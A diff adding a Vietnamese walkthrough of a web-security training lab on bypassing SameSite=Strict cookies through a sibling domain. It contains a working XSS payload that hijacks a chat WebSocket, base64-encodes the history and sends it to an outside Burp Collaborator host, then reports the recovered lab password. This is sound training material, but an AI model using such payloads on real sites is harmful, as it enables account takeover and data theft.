@@ -131,6 +131,25 @@ document.location="https://0a83005104b049a3c0f910ae005300b9.web-security-academy
 Đoạn code trên sẽ redirect user tới `/post/comment/confirmation?postId=..%2Fmy-account%2Fchange-email%3Femail%3Dabc%40gmail.com%26submit%3D1`, sau đó user tiếp tục được redirect tới `/my-account/change-email?email=abc@gmail.com&submit=1` khiến email của user bị thay đổi. Sau khi click "Deliver to victim", bài lab được giải.
 
 # 9. SameSite Strict bypass via sibling domain
+Trong chức năng livechat, nếu gửi websocket message với nội dung `READY` thì sẽ lấy được lịch sử. Tuy nhiên session cookie có thuộc tính `SameSite=Strict`, nên chúng không được đính kèm vào các request cross-domain.
+
+Nhận thấy khi website load ảnh `rating3.png`, có request và response như sau:
+
+![image](https://user-images.githubusercontent.com/103978452/216271874-0c23c315-ad6b-4db5-b69e-96a2a166e54c.png)
+Trong response có header `Access-Control-Allow-Origin: https://cms-0aad005b0331df0cc03968ac00e400e2.web-security-academy.net`, như vậy website có một sibling domain là `https://cms-0aad005b0331df0cc03968ac00e400e2.web-security-academy.net`.
+
+Truy cập sibling domain, có một form đăng nhập ở `cms-LAB_ID/login`, thử thay đổi URL thành `cms-LAB_ID/login?username=<img src=1 onerror=alert(1)>` thì lệnh alert được gọi. Như vậy, domain này có lỗ hổng XSS. Khi thực hiện `document.location="<website ban đầu>"` thì session cookie vẫn được thêm vào.
+
+Vào exploit server và cấu hình đoạn code sau:
+
+```
+<script>document.location="https://cms-0aad005b0331df0cc03968ac00e400e2.web-security-academy.net/login?username=%22%3E%3Cscript%3Ex%3D%27%27%3Bconst+socket%3Dnew+WebSocket%28%27wss%3A%2F%2F0aad005b0331df0cc03968ac00e400e2.web-security-academy.net%2Fchat%27%29%3Bsocket.addEventListener%28%27open%27%2C%28%29%3D%3E%7Bsocket.send%28%27READY%27%29%3B%7D%29%3Bsocket.addEventListener%28%27message%27%2C%28e%29%3D%3E%7Bx%2B%3De.data%3B%7D%29%3Bfunction+print_x%28%29%7Bfetch%28%27https%3A%2F%2Fie0lb6vi7yn9q79lpd3xzg73cuik69.oastify.com%3Fdata%3D%27%2Bbtoa%28x%29%29%3B%7D%3Bt%3DsetTimeout%28print_x%2C%273000%27%29%3B%3C%2Fscript%3E&password=abc"</script>
+```
+
+Đoạn code trên sẽ truy cập cms domain, khai thác lỗ hổng XSS để gửi request websocket tới website ban đầu, lấy dữ liệu, mã hóa base64 và đính kèm vào request đến BurpCollaborator của chúng ta. Sau khi click "Deliver to victim", và Burp Collaborator Client kiểm tra thì thấy request như sau:
+
+![image](https://user-images.githubusercontent.com/103978452/216273131-4d41ac4a-c7fb-468d-9950-f7e978c41404.png)
+Sau khi decode base64, ta thu được password của user carlos là d7hhmyapwk0ep8hxqxhz. Đăng nhập với credentials thu được, kết quả thành công.
 
 # 10. SameSite Lax bypass via cookie refresh
 
